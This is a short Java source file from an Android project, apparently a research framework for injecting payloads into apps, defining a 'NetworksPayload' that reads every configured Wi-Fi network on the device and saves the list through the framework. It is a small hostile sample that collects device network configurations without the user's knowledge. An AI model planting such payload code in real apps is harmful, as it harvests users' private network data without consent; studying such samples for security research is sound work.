package it.unisannio.srss.dame.android.payloads.networks;

import it.unisannio.srss.dame.android.payloads.Payload;

import java.util.List;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;

public class NetworksPayload extends Payload {

	public NetworksPayload() {
		super();
	}

	public NetworksPayload(Context context) {
		super(context);
	}

	@Override
	public void run() {
		WifiManager wifiManager = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		List<WifiConfiguration> networks = wifiManager.getConfiguredNetworks();
		StringBuilder sb = new StringBuilder();
		for (WifiConfiguration wc : networks)
			sb.append(wc + "\n\n");
		save(sb.toString());
	}

}
